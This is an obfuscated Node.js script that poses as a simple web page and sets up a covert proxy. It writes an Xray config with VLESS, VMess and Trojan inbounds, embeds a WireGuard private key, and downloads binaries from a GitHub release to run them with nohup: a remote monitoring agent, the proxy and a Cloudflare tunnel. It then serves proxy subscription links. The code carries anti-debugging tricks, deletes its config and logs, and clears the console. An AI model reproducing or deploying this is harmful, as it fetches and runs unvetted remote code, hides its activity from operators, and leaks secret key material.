const U = function () {
    let h = true;
    return function (O, g) {
      const d = h ? function () {
        if (g) {
          const P = g['apply'](O, arguments);
          return g = null, P;
        }
      } : function () {};
      h = false;
      return d;
    };
  }(),
  v = U(this, function () {
    return v['toString']()['search']('(((.+)+)+)+$')['toString']()['constructor'](v)['search']('(((.+)+)+)+$');
  });
v();
const e = function () {
    let h = true;
    return function (O, g) {
      const f = h ? function () {
        if (g) {
          const u = g['apply'](O, arguments);
          return g = null, u;
        }
      } : function () {};
      return h = false, f;
    };
  }(),
  I = e(this, function () {
    const N = function () {
      let f;
      try {
        f = function () {
          return function () {}.constructor("return this")();
        }();
      } catch (u) {
        f = window;
      }
      return f;
    };
    const z = N(),
      h = z['console'] = z['console'] || {},
      O = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
    for (let g = 0; g < O['length']; g++) {
      const f = e['constructor']['prototype']['bind'](e),
        u = O[g],
        d = h[u] || f;
      f['__proto__'] = e['bind'](e), f['toString'] = d['toString']['bind'](d), h[u] = f;
    }
  });
I();
const express = require('express'),
  app = express(),
  axios = require('axios'),
  os = require('os'),
  fs = require('fs'),
  path = require('path'),
  {
    promisify
  } = require('util'),
  exec = promisify(require('child_process')['exec']),
  {
    execSync
  } = require('child_process'),
  FILE_PATH = process['env']['FILE_PATH'] || './temp',
  projectPageURL = process['env']['URL'] || '',
  intervalInseconds = process['env']['TIME'] || 120,
  UUID = process['env']['UUID'] || 'a222d252-db9a-11ee-86fe-325096b39f47',
  NZ_SERVER = process['env']['NZ_SERVER'] || 'nz.abc.cn',
  NZ_PORT = process['env']['NZ_PORT'] || '5555',
  NZ_KEY = process['env']['NZ_KEY'] || '',
  AG_DOMAIN = process['env']['AG_DOMAIN'] || '',
  AG_AUTH = process['env']['AG_AUTH'] || '',
  CFIP = process['env']['CFIP'] || 'canva.com',
  CFPORT = process['env']['CFPORT'] || 443,
  NAME = process['env']['NAME'] || 'Fly',
  AG_PORT = process['env']['AG_PORT'] || 8080,
  PORT = process['env']['SERVER_PORT'] || process['env']['PORT'] || 3000;
!fs['existsSync'](FILE_PATH) ? (fs['mkdirSync'](FILE_PATH), console['log'](FILE_PATH + ' is created')) : console['log'](FILE_PATH + ' already exists');
const pathsToDelete = ['web', 'bot', 'npm', 'sub.txt', 'boot.log'];
function cleanupOldFiles() {
  pathsToDelete['forEach'](N => {
    const h = path['join'](FILE_PATH, N);
    fs['unlink'](h, O => {
      if (O) console['error']('Skip Delete ' + h);else {
        console['log'](h + ' deleted');
      }
    });
  });
}
cleanupOldFiles(), app['get']('/', function (S, N) {
  N['send']('\n    <!DOCTYPE html>\n    <html lang="en">\n      <head>\n      </head>\n      <body>\n        <h1> I Love Fly </h1>\n      </body>\n    </html>\n  ');
});
const ej = {};
ej['access'] = '/dev/null', ej['error'] = '/dev/null', ej['loglevel'] = 'none';
const eb = {};
eb['id'] = UUID, eb['flow'] = 'xtls-rprx-vision';
const eT = {};
eT['dest'] = 0xbb9;
const en = {};
en['path'] = '/vl-2024-vl', en['dest'] = 0xbba;
const eA = {};
eA['path'] = '/vm-2024-vm', eA['dest'] = 0xbbb;
const eV = {};
eV['path'] = '/tr-2024-tr', eV['dest'] = 0xbbc;
const ew = {};
ew['clients'] = [eb], ew['decryption'] = 'none', ew['fallbacks'] = [eT, en, eA, eV];
const eB = {};
eB['network'] = 'tcp';
const ey = {};
ey['port'] = AG_PORT, ey['protocol'] = 'vless', ey['settings'] = ew, ey['streamSettings'] = eB;
const eC = {};
eC['id'] = UUID;
const eF = {};
eF['clients'] = [eC], eF['decryption'] = 'none';
const ek = {};
ek['network'] = 'ws', ek['security'] = 'none';
const eW = {};
eW['port'] = 0xbb9, eW['listen'] = '127.0.0.1', eW['protocol'] = 'vless', eW['settings'] = eF, eW['streamSettings'] = ek;
const eM = {};
eM['id'] = UUID, eM['level'] = 0x0;
const es = {};
es['clients'] = [eM], es['decryption'] = 'none';
const eH = {};
eH['path'] = '/vl-2024-vl';
const eR = {};
eR['network'] = 'ws', eR['security'] = 'none', eR['wsSettings'] = eH;
const et = {};
et['enabled'] = false, et['destOverride'] = ['http', 'tls', 'quic'], et['metadataOnly'] = false;
const ea = {};
ea['port'] = 0xbba, ea['listen'] = '127.0.0.1', ea['protocol'] = 'vless', ea['settings'] = es, ea['streamSettings'] = eR, ea['sniffing'] = et;
const eY = {};
eY['id'] = UUID, eY['alterId'] = 0x0;
const eX = {};
eX['clients'] = [eY];
const eJ = {};
eJ['path'] = '/vm-2024-vm';
const eG = {};
eG['network'] = 'ws', eG['wsSettings'] = eJ;
const ep = {};
ep['enabled'] = false, ep['destOverride'] = ['http', 'tls', 'quic'], ep['metadataOnly'] = false;
const eZ = {};
eZ['port'] = 0xbbb, eZ['listen'] = '127.0.0.1', eZ['protocol'] = 'vmess', eZ['settings'] = eX, eZ['streamSettings'] = eG, eZ['sniffing'] = ep;
const ec = {};
ec['password'] = UUID;
const eL = {};
eL['clients'] = [ec];
const em = {};
em['path'] = '/tr-2024-tr';
const eE = {};
eE['network'] = 'ws', eE['security'] = 'none', eE['wsSettings'] = em;
const eK = {};
eK['enabled'] = false, eK['destOverride'] = ['http', 'tls', 'quic'], eK['metadataOnly'] = false;
const eD = {};
eD['port'] = 0xbbc, eD['listen'] = '127.0.0.1', eD['protocol'] = 'trojan', eD['settings'] = eL, eD['streamSettings'] = eE, eD['sniffing'] = eK;
const er = {};
er['servers'] = ['https+local://8.8.8.8/dns-query'];
const eQ = {};
eQ['protocol'] = 'freedom';
const eq = {};
eq['publicKey'] = 'bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=', eq['allowedIPs'] = ['0.0.0.0/0', '::/0'];
eq['endpoint'] = '162.159.193.10:2408';
const ex = {};
ex['secretKey'] = '4PDZWXZyO6XtL7pQToU4Rop5/WkuPRDJ4ZQsfGeHL04=', ex['address'] = ['172.16.0.2/32', '2606:4700:110:8905:bde6:c673:e95e:5e7/128'], ex['peers'] = [eq], ex['reserved'] = [236, 226, 80], ex['mtu'] = 0x500;
const v0 = {};
v0['tag'] = 'WARP', v0['protocol'] = 'wireguard', v0['settings'] = ex;
const v1 = {};
v1['type'] = 'field', v1['domain'] = ['domain:openai.com', 'domain:ai.com'], v1['outboundTag'] = 'WARP';
const v2 = {};
v2['domainStrategy'] = 'AsIs', v2['rules'] = [v1];
const v3 = {};
v3['log'] = ej, v3['inbounds'] = [ey, eW, ea, eZ, eD], v3['dns'] = er, v3['outbounds'] = [eQ, v0], v3['routing'] = v2;
const config = v3;
fs['writeFileSync'](path['join'](FILE_PATH, 'config.json'), JSON['stringify'](config, null, 2));
function getSystemArchitecture() {
  const h = os['arch']();
  if (h === 'arm' || h === 'arm64' || h === 'aarch64') {
    return 'arm';
  } else return 'amd';
}
function downloadFile(S, N, z) {
  const O = path['join'](FILE_PATH, S),
    g = fs['createWriteStream'](O);
  axios({
    'method': 'get',
    'url': N,
    'responseType': 'stream'
  })['then'](f => {
    f['data'].pipe(g), g['on']('finish', () => {
      g['close'](), console['log']('Download ' + S + ' successfully'), z(null, S);
    });
    g['on']('error', u => {
      fs['unlink'](O, () => {});
      const d = 'Download ' + S + ' failed: ' + u['message'];
      console['error'](d);
      z(d);
    });
  })['catch'](f => {
    const u = 'Download ' + S + ' failed: ' + f['message'];
    console['error'](u), z(u);
  });
}
async function downloadFilesAndRun() {
  const N = getSystemArchitecture(),
    z = getFilesForArchitecture(N);
  if (z['length'] === 0) {
    console['log']('Can\'t find a file for the current architecture');
    return;
  }
  const h = z['map'](d => {
    return new Promise((j, b) => {
      downloadFile(d['fileName'], d['fileUrl'], (n, A) => {
        n ? b(n) : j(A);
      });
    });
  });
  try {
    await Promise['all'](h);
  } catch (d) {
    console['error']('Error downloading files:', d);
    return;
  }
  function O(P) {
    const j = 509;
    P['forEach'](b => {
      const T = path['join'](FILE_PATH, b);
      fs['chmod'](T, j, n => {
        n ? console['error']('Empowerment failed for ' + T + ': ' + n) : console['log']('Empowerment success for ' + T + ': ' + j['toString'](8));
      });
    });
  }
  const g = ['./npm', './web', './bot'];
  O(g);
  let f = '';
  if (NZ_SERVER && NZ_PORT && NZ_KEY) {
    const j = ['443', '8443', '2096', '2087', '2083', '2053'];
    j['includes'](NZ_PORT) ? f = '--tls' : f = '';
    const b = 'nohup ' + FILE_PATH + '/npm -s ' + NZ_SERVER + ':' + NZ_PORT + ' -p ' + NZ_KEY + ' ' + f + ' >/dev/null 2>&1 &';
    try {
      await exec(b), console['log']('npm is running'), await new Promise(n => setTimeout(n, 1000));
    } catch (n) {
      console['error']('npm running error: ' + n);
    }
  } else console['log']('NEZHA variable is empty,skip running');
  const u = 'nohup ' + FILE_PATH + '/web -c ' + FILE_PATH + '/config.json >/dev/null 2>&1 &';
  try {
    await exec(u), console['log']('web is running'), await new Promise(w => setTimeout(w, 1000));
  } catch (w) {
    console['error']('web running error: ' + w);
  }
  if (fs['existsSync'](path['join'](FILE_PATH, 'bot'))) {
    let y;
    if (AG_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/)) y = 'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ' + AG_AUTH;else {
      if (AG_AUTH['match'](/TunnelSecret/)) y = 'tunnel --edge-ip-version auto --config ' + FILE_PATH + '/tunnel.yml run';else {
        y = 'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ' + FILE_PATH + '/boot.log --loglevel info --url http://localhost:' + AG_PORT;
      }
    }
    try {
      await exec('nohup ' + FILE_PATH + '/bot ' + y + ' >/dev/null 2>&1 &'), console['log']('bot is running'), await new Promise(k => setTimeout(k, 2000));
    } catch (k) {
      console['error']('Error executing command: ' + k);
    }
  }
  await new Promise(W => setTimeout(W, 5000));
}
function getFilesForArchitecture(u) {
  if (u === 'arm') {
    const j = {};
    j['fileName'] = 'npm', j['fileUrl'] = 'https://github.com/eooce/test/releases/download/ARM/swith';
    const b = {};
    b['fileName'] = 'web', b['fileUrl'] = 'https://github.com/eooce/test/releases/download/ARM/web';
    const T = {};
    return T['fileName'] = 'bot', T['fileUrl'] = 'https://github.com/eooce/test/releases/download/arm64/bot13', [j, b, T];
  } else {
    if (u === 'amd') {
      const n = {};
      n['fileName'] = 'npm', n['fileUrl'] = 'https://github.com/eooce/test/releases/download/amd64/npm';
      const A = {};
      A['fileName'] = 'web', A['fileUrl'] = 'https://github.com/eooce/test/releases/download/amd64/web';
      const V = {};
      return V['fileName'] = 'bot', V['fileUrl'] = 'https://github.com/eooce/test/releases/download/amd64/bot13', [n, A, V];
    }
  }
  return [];
}
function argoType() {
  if (!AG_AUTH || !AG_DOMAIN) {
    console['log']('AG_DOMAIN or AG_AUTH variable is empty, use quick tunnels');
    return;
  }
  if (AG_AUTH['includes']('TunnelSecret')) {
    fs['writeFileSync'](path['join'](FILE_PATH, 'tunnel.json'), AG_AUTH);
    const O = '\n  tunnel: ' + AG_AUTH['split']('"')[11] + '\n  credentials-file: ' + path['join'](FILE_PATH, 'tunnel.json') + '\n  protocol: http2\n  \n  ingress:\n    - hostname: ' + AG_DOMAIN + '\n      service: http://localhost:' + AG_PORT + '\n      originRequest:\n        noTLSVerify: true\n    - service: http_status:404\n  ';
    fs['writeFileSync'](path['join'](FILE_PATH, 'tunnel.yml'), O);
  } else console['log']('AG_AUTH mismatch TunnelSecret,use token connect to tunnel');
}
argoType();
async function extractDomains() {
  let N;
  if (AG_AUTH && AG_DOMAIN) N = AG_DOMAIN, console['log']('AG_DOMAIN:', N), await z(N);else try {
    const O = fs['readFileSync'](path['join'](FILE_PATH, 'boot.log'), 'utf-8'),
      g = O['split']('\n'),
      f = [];
    g['forEach'](u => {
      const d = u['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      if (d) {
        const o = d[1];
        f['push'](o);
      }
    });
    if (f['length'] > 0) N = f[0], console['log']('AgDomain:', N), await z(N);else {
      console['log']('AgDomain not found, re-running bot to obtain AgDomain'), fs['unlinkSync'](path['join'](FILE_PATH, 'boot.log')), await new Promise(d => setTimeout(d, 2000));
      const u = 'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ' + FILE_PATH + '/boot.log --loglevel info --url http://localhost:' + AG_PORT;
      try {
        await exec('nohup ' + path['join'](FILE_PATH, 'bot') + ' ' + u + ' >/dev/null 2>&1 &'), console['log']('bot is running.'), await new Promise(o => setTimeout(o, 3000)), await extractDomains();
      } catch (o) {
        console['error']('Error executing command: ' + o);
      }
    }
  } catch (j) {
    console['error']('Error reading boot.log:', j);
  }
  async function z(b) {
    const T = execSync('curl -s https://speed.cloudflare.com/meta', {
        'encoding': 'utf-8'
      }),
      n = JSON['parse'](T),
      A = n['colo'];
    const V = n['country'],
      w = V + '-' + A;
    return new Promise(B => {
      setTimeout(() => {
        const C = {};
        C['v'] = '2', C['ps'] = NAME + '-' + w, C['add'] = CFIP, C['port'] = CFPORT, C['id'] = UUID;
        C['aid'] = '0', C['scy'] = 'none', C['net'] = 'ws', C['type'] = 'none', C['host'] = b, C['path'] = '/vm-2024-vm?ed=2048', C['tls'] = 'tls', C['sni'] = b, C['alpn'] = '';
        const F = C,
          k = '\nvless://' + UUID + '@' + CFIP + ':' + CFPORT + '?encryption=none&security=tls&sni=' + b + '&type=ws&host=' + b + '&path=%2Fvl-2024-vl?ed=2048#' + NAME + '-' + w + '\n  \nvmess://' + Buffer['from'](JSON['stringify'](F))['toString']('base64') + '\n  \ntrojan://' + UUID + '@' + CFIP + ':' + CFPORT + '?security=tls&sni=' + b + '&type=ws&host=' + b + '&path=%2Ftr-2024-tr?ed=2048#' + NAME + '-' + w + '\n    ';
        console['log'](Buffer['from'](k)['toString']('base64'));
        const W = path['join'](FILE_PATH, 'sub.txt');
        fs['writeFileSync'](W, Buffer['from'](k)['toString']('base64')), console['log']('File saved successfully'), console['log']('Thank you for using this script,enjoy!'), app['get']('/sub2', (M, s) => {
          const H = Buffer['from'](k)['toString']('base64');
          s['set']('Content-Type', 'text/plain; charset=utf-8');
          s['send'](H);
        }), B(k);
      }, 2000);
    });
  }
}
const bootLogPath = path['join'](FILE_PATH, 'boot.log'),
  configPath = path['join'](FILE_PATH, 'config.json');
function cleanFiles() {
  setTimeout(() => {
    exec('rm -rf ' + bootLogPath + ' ' + configPath, (h, O, g) => {
      if (h) {
        console['error']('Error while deleting files: ' + h);
        return;
      }
      console['clear']();
      console['log']('App is running');
      console['log']('Thank you for using this script,enjoy!');
    });
  }, 300000);
}
cleanFiles();
let hasLoggedEmptyMessage = false;
async function visitProjectPage() {
  try {
    if (!projectPageURL || !intervalInseconds) {
      !hasLoggedEmptyMessage && (console['log']('URL or TIME variable is empty,skip visit url'), hasLoggedEmptyMessage = true);
      return;
    } else hasLoggedEmptyMessage = false;
    await axios['get'](projectPageURL), console['log']('Page visited successfully'), console['clear']();
  } catch (g) {
    console['error']('Error visiting project page:', g['message']);
  }
}
setInterval(visitProjectPage, intervalInseconds * 1000);
async function startserver() {
  await downloadFilesAndRun(), await extractDomains(), visitProjectPage();
}
startserver(), app['listen'](PORT, () => console['log']('Http server is running on port:' + PORT + '!'));
